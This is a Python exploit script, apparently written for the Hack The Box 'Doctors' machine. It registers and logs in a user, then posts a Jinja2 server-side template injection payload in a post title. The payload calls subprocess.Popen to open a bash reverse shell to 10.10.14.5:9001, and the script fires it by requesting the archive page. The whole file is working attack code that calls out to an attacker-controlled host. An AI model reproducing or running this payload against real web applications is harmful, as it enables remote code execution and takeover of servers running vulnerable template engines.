import requests
import sys

url = "http://doctors.htb/"
username = "norman"
password = "test1"
LHOST = "10.10.14.5"
LPORT = "9001"


def register(session):
    reg_path = "register"
    print("[+] Registering user [norman:test1]")
    data = {
            "username" : username, "password" : password, "confirm_password" : password, "email" : username + "@doctors.htb", "submit" : "Sign-Up"
    }
    r = session.post(url+reg_path, data = data)
    return r

def login(session):
    log_path = "login"
    print("[+] Logging in as norman")
    data = {
        "email" : username+"@doctors.htb",
        "password" : password,
        "submit" : "Login"
    }
    log_user = session.post(url + log_path, data = data)
    return log_user


def create_payload():
    cmd = 'bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1 \"'% (LHOST,LPORT)
    payload = "{{\"\".__class__.__mro__[1].__subclasses__()[407] ('%s',shell=True, stdout=-1).communicate()}}" %cmd
    # cmd = "id"
    # payload = "{{ \'\'.__class__.__mro__[1].__subclasses__()[407] (\'id\')}}"
    # print(payload)
    return payload

def inject_ssti(session, payload):
    post_path = "post/new"
    data = {
            "title" : payload,
            "content" : "Trying out SSTI",
            "submit" : "Post"
    }
    post_ssti = session.post(url + post_path, data = data)
    return post_ssti

def main():
    sess = requests.session()
    sess.get("http://doctors.htb")
    
    reg_user = register(sess)
    if "username already" in reg_user.text:
        print("[!] Username already registered")

    log_user = login(sess)
    if "Invalid email address" in log_user.text:
        print("[-] Invalid credentials")
        print("[!] Exiting...")
        sys.exit(0)

    print("[+] Logged in as norman") 

    payload = create_payload()
    # input(f"[!] Reverse Shell running on {LHOST}:{LPORT}?")

    print("[!] Injecting SSTI for RCE")
    post_ssti = inject_ssti(sess, payload)

    print("[+] Executing Payload")
    sess.get(url+"archive")

main()
# create_payload()
